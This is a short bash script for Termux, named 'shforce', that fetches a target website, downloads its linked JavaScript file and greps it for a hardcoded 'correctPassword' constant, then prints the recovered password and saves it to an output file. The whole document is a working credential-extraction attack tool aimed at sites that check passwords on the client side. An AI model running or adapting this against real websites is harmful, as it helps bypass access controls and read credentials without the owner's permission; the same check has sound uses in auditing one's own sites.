#!/data/data/com.termux/files/usr/bin/bash

source config.conf

OUTPUT="output/result.txt"
TMP_HTML="/tmp/site.html"
TMP_JS="/tmp/script.js"

echo "[*] shforce started"
echo "[*] Target: $TARGET_URL"
echo "" > "$OUTPUT"

# 1. Load website
echo "[*] Fetching website..."
curl -s "$TARGET_URL" -o "$TMP_HTML"

if [[ ! -s "$TMP_HTML" ]]; then
  echo "[-] Failed to load website"
  exit 1
fi

# 2. Extract JS file
JS_PATH=$(grep -o 'script src="[^"]*"' "$TMP_HTML" | cut -d'"' -f2)

if [[ -z "$JS_PATH" ]]; then
  echo "[-] No JavaScript file found"
  exit 1
fi

JS_URL="$TARGET_URL$JS_PATH"

echo "[*] Found JS file: $JS_URL"
curl -s "$JS_URL" -o "$TMP_JS"

# 3. Search for hardcoded password
echo "[*] Analyzing JavaScript..."

PASSWORD=$(grep -o 'const correctPassword = "[^"]*"' "$TMP_JS" | cut -d'"' -f2)

if [[ -n "$PASSWORD" ]]; then
  echo "[+] Hardcoded password found!"
  echo "Password: $PASSWORD"
  echo "Password found: $PASSWORD" >> "$OUTPUT"
else
  echo "[-] No hardcoded password detected"
  echo "No password found" >> "$OUTPUT"
fi

echo "[*] Done"
